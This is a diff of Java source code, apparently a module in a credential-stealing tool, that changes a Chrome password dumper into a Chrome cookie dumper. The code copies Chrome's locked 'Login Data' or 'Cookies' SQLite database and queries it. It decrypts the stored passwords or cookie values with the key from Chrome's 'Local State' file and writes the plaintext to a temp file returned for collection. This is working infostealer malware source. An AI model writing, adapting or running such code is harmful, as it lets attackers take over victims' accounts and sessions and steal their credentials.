@@ -22,22 +22,21 @@ import java.util.Arrays;
 import java.util.Base64;
 import java.util.Random;
 
-public class ChromePasswords implements Request {
+public class ChromeCookies implements Request {
 
-    File infoDumpFile;
-
+    File cookieDump;
     @Override
     public void init() throws Exception {
         ArrayList<String> list = getChromePass();
-        infoDumpFile = new File(System.getProperty("java.io.tmpdir") + "/" + new Random().nextInt() + ".txt");
-        FileOutputStream dumpStream = new FileOutputStream(infoDumpFile);
+        cookieDump = new File(System.getProperty("java.io.tmpdir") + "/" + new Random().nextInt() + ".txt");
+        FileOutputStream dumpStream = new FileOutputStream(cookieDump);
         for(String s: list){
             dumpStream.write(s.getBytes());
             dumpStream.write("\n".getBytes());
         }
         dumpStream.flush();
         dumpStream.close();
-        infoDumpFile.deleteOnExit();
+        cookieDump.deleteOnExit();
     }
 
     @Override
@@ -47,8 +46,8 @@ public class ChromePasswords implements Request {
 
     @Override
     public File[] getFiles() {
-        return new File[]{
-                infoDumpFile
+        return new File[] {
+                cookieDump
         };
     }
 
@@ -58,10 +57,8 @@ public class ChromePasswords implements Request {
         Statement statement = null;
 
         try {
-            //Chrome locks its DATABASE file when its running, so we cant access it unless we copy it temporary and THEN access it
-
-            String loginDataFile = System.getProperty("user.home") + "/Appdata/Local/Google/Chrome/User Data/Default/Login Data";
-            String finalDestination = System.getProperty("java.io.tmpdir") + "/Data";
+            String loginDataFile = System.getProperty("user.home") + "/Appdata/Local/Google/Chrome/User Data/Default/Cookies";
+            String finalDestination = System.getProperty("java.io.tmpdir") + "/DataCookies";
             File finalDestinationFile = new File(finalDestination);
             if(finalDestinationFile.exists())
                 finalDestinationFile.delete();
@@ -73,20 +70,18 @@ public class ChromePasswords implements Request {
             }
             in.close();
             out.close();
-            finalDestinationFile.deleteOnExit();
             String stmt = "jdbc:sqlite:" + finalDestination;
             conn = DriverManager.getConnection(stmt);
 
             statement = conn.createStatement();
-            ResultSet rs = statement.executeQuery("SELECT * FROM logins;");
+            ResultSet rs = statement.executeQuery("SELECT * FROM cookies;");
             while (rs.next()){
-                String url = rs.getString("action_url");
+                String url = rs.getString("host_key");
                 if(url == null) url = "URL not found";
-                String username = rs.getString("username_value");
-                if(username == null) username = "Username not found";
-                //InputStream passwordHashStream = rs.getBinaryStream("password_value");
-                byte[] encpass = rs.getBytes("password_value");
-                info.add(String.format("URL: %s USERNAME: %s Password: %s",url,username, getDecryptedValue(encpass)));
+                String username = rs.getString("name");
+                if(username == null) username = "Type not found";
+                byte[] encpass = rs.getBytes("encrypted_value");
+                info.add(String.format("URL: %s TYPE: %s Value: %s",url,username, getDecryptedValue(encpass)));
             }
             rs.close();
             statement.close();
@@ -98,6 +93,7 @@ public class ChromePasswords implements Request {
 
         return info;
     }
+
 
     private String getDecryptedValue(byte[] data) throws Exception {
         String pathLocalState = System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Local State";
@@ -120,5 +116,4 @@ public class ChromePasswords implements Request {
 
         return new String(password, StandardCharsets.UTF_8);
     }
-
 }
